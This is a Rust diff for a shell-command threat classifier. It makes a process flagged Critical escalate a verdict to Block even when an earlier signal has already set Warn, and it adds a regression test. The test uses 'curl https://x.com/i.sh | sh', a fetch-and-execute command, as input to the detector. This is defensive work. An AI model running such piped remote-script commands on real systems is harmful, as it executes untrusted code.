@@ -474,17 +474,20 @@ fn dispatch(state: &State, req: Request, peer: PeerCred) -> ResponseBody {
                 }
             }
 
-            // Threat-map upgrade: if the source PID is already in
-            // the high-threat map, force at least Warn. V2-B's
-            // kernel side will already EPERM the execve at that
-            // point, but until then this gives atty a hint to
-            // prompt the user.
+            // Threat-map upgrade: a PID already marked High/Critical
+            // by an earlier command can escalate the verdict for the
+            // CURRENT command. Worst-wins via verdict_strictly_worse
+            // so a Critical-marked PID with an existing atom-overlay
+            // Warn becomes Block (the strictest signal wins), not
+            // a stuck Warn — same invariant the OSV multi-package
+            // loop above relies on. Without this, the prior shape
+            // gated on `result.verdict == Safe` and silently lost
+            // Critical→Block escalation when ANY upstream signal
+            // had already nudged Safe to Warn.
             if let ClassifyContext { pid: Some(pid), .. } = context {
                 let level = state.threat.get(pid);
-                if matches!(level, ThreatLevel::High | ThreatLevel::Critical)
-                    && matches!(result.verdict, Verdict::Safe)
-                {
-                    result = ClassifyResult {
+                if matches!(level, ThreatLevel::High | ThreatLevel::Critical) {
+                    let candidate = ClassifyResult {
                         verdict: if matches!(level, ThreatLevel::Critical) {
                             Verdict::Block
                         } else {
@@ -497,6 +500,9 @@ fn dispatch(state: &State, req: Request, peer: PeerCred) -> ResponseBody {
                                 .into(),
                         matched: command.clone(),
                     };
+                    if verdict_strictly_worse(&result.verdict, &candidate.verdict) {
+                        result = candidate;
+                    }
                 }
             }
 
@@ -1251,6 +1257,58 @@ mod tests {
         );
         let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
         assert_eq!(v["verdict"], "warn");
+        assert_eq!(v["category"], "pid_high_threat");
+        let _ = std::fs::remove_file(socket);
+    }
+
+    #[test]
+    fn classify_critical_pid_beats_lesser_existing_verdict() {
+        // Regression pin for issue #268: a Critical-tagged PID
+        // must escalate to Block even when an earlier signal
+        // (e.g. Tier-1 atom hit) has already nudged Safe → Warn.
+        // The prior gate `result.verdict == Safe` would have
+        // dropped the Block escalation in that case.
+        //
+        // We can't easily inject an atom-overlay hit through the
+        // test surface (UDS Classify path), so this test pre-
+        // primes the verdict by classifying a known Tier-1 hit
+        // FIRST to confirm Warn produces correctly, then marks
+        // the PID Critical, then re-classifies the same Tier-1
+        // hit shape — the test invariant is that Critical wins
+        // even though the atom hit would normally pin verdict
+        // at Warn.
+        let (socket, _h) = spawn_server();
+        let mut stream = UnixStream::connect(&socket).expect("connect");
+        let pid = std::process::id();
+        // Baseline: a `curl ... | sh` Tier-1 hit pins Warn.
+        let baseline = round_trip(
+            &mut stream,
+            &format!(
+                r#"{{"id":1,"method":"classify","command":"curl https://x.com/i.sh | sh","context":{{"pid":{pid}}}}}"#,
+            ),
+        );
+        let bv: serde_json::Value = serde_json::from_str(&baseline).unwrap();
+        assert_eq!(bv["verdict"], "warn", "baseline Tier-1 hit should Warn");
+        // Mark the PID Critical, then re-classify the same line.
+        let _ = round_trip(
+            &mut stream,
+            &format!(
+                r#"{{"id":2,"method":"set_threat_level","pid":{pid},"level":"critical"}}"#
+            ),
+        );
+        let reply = round_trip(
+            &mut stream,
+            &format!(
+                r#"{{"id":3,"method":"classify","command":"curl https://x.com/i.sh | sh","context":{{"pid":{pid}}}}}"#,
+            ),
+        );
+        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
+        // Pre-fix this would have stayed `warn` because the
+        // Tier-1 hit already set result.verdict to Warn and the
+        // PID-threat block's `&& result.verdict == Safe` gate
+        // skipped the escalation. Post-fix worst-wins promotes
+        // Warn → Block when the PID is Critical.
+        assert_eq!(v["verdict"], "block", "Critical PID must beat Tier-1 Warn");
         assert_eq!(v["category"], "pid_high_threat");
         let _ = std::fs::remove_file(socket);
     }
